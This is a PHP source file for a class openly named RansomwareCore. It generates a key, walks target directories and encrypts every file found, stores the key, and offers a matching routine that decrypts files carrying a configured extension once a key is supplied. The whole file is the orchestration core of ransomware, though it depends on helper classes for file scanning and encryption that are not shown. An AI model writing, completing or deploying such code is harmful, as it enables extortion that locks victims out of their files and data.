<?php
namespace App\Models;

use App\Core\ConfigManager;
use App\Core\Logger;

class RansomwareCore {
    private $fileSystem;
    private $cryptoManager;
    private $fileEncryptor;
    private $nameEncryptor;
    private $config;
    
    public function __construct() {
        $this->fileSystem = new FileSystem();
        $this->cryptoManager = new CryptoManager();
        $this->fileEncryptor = new \App\Services\FileEncryptor();
        $this->nameEncryptor = new \App\Services\NameEncryptor();
        $this->config = ConfigManager::load('encryption');
    }
    
    public function executeEncryption() {
        try {
            Logger::info("Starting encryption process");
            
            $key = $this->cryptoManager->generateKey();
            $directories = $this->fileSystem->getTargetDirectories();
            
            $totalFiles = 0;
            $encryptedFiles = 0;
            
            foreach ($directories as $directory) {
                Logger::info("Processing directory: {$directory}");
                $result = $this->processDirectory($directory, $key);
                $totalFiles += $result['total'];
                $encryptedFiles += $result['encrypted'];
            }
            
            $this->generateDecryptionFile($key);
            $this->cleanup();
            
            Logger::info("Encryption completed", [
                'total_files' => $totalFiles,
                'encrypted_files' => $encryptedFiles,
                'directories' => count($directories)
            ]);
            
            return [
                'success' => true,
                'encrypted_files' => $encryptedFiles,
                'total_files' => $totalFiles,
                'directories' => count($directories)
            ];
            
        } catch (\Exception $e) {
            Logger::error("Encryption failed", ['error' => $e->getMessage()]);
            throw $e;
        }
    }
    
    private function processDirectory($directory, $key) {
        $files = $this->fileSystem->scanDirectory($directory);
        $encryptedCount = 0;
        
        foreach ($files as $file) {
            try {
                if ($this->fileEncryptor->encrypt($file, $key)) {
                    $encryptedCount++;
                }
            } catch (\Exception $e) {
                Logger::error("Failed to encrypt file: {$file}", ['error' => $e->getMessage()]);
            }
        }
        
        return [
            'total' => count($files),
            'encrypted' => $encryptedCount
        ];
    }
    
    private function generateDecryptionFile($key) {
        $cryptoInfo = $this->cryptoManager->getCryptoInfo();
        $keyStorage = new KeyStorage();
        $keyStorage->saveKeyInfo($key, $cryptoInfo);
        
        Logger::info("Decryption file generated");
    }
    
    private function cleanup() {
        // Remove temporary files and clean up
        Logger::info("Cleanup completed");
    }
    
    public function executeDecryption($decryptionKey) {
        try {
            Logger::info("Starting decryption process");
            
            $keyStorage = new KeyStorage();
            $keyInfo = $keyStorage->loadKeyInfo($decryptionKey);
            
            if (!$keyInfo) {
                throw new \Exception("Invalid decryption key");
            }
            
            $this->cryptoManager->setCryptoParams($keyInfo['salt'], $keyInfo['iv']);
            
            $directories = $this->fileSystem->getTargetDirectories();
            $decryptedFiles = 0;
            
            foreach ($directories as $directory) {
                $decryptedFiles += $this->decryptDirectory($directory, $decryptionKey);
            }
            
            $keyStorage->deleteKeyInfo();
            
            Logger::info("Decryption completed", ['decrypted_files' => $decryptedFiles]);
            
            return [
                'success' => true,
                'decrypted_files' => $decryptedFiles
            ];
            
        } catch (\Exception $e) {
            Logger::error("Decryption failed", ['error' => $e->getMessage()]);
            throw $e;
        }
    }
    
    private function decryptDirectory($directory, $key) {
        $files = $this->findEncryptedFiles($directory);
        $decryptedCount = 0;
        
        foreach ($files as $file) {
            try {
                if ($this->fileEncryptor->decrypt($file, $key)) {
                    $decryptedCount++;
                }
            } catch (\Exception $e) {
                Logger::error("Failed to decrypt file: {$file}", ['error' => $e->getMessage()]);
            }
        }
        
        return $decryptedCount;
    }
    
    private function findEncryptedFiles($directory) {
        $encryptedFiles = [];
        $files = $this->fileSystem->scanDirectory($directory);
        
        foreach ($files as $file) {
            if (pathinfo($file, PATHINFO_EXTENSION) === $this->config['crypto']['extension']) {
                $encryptedFiles[] = $file;
            }
        }
        
        return $encryptedFiles;
    }
}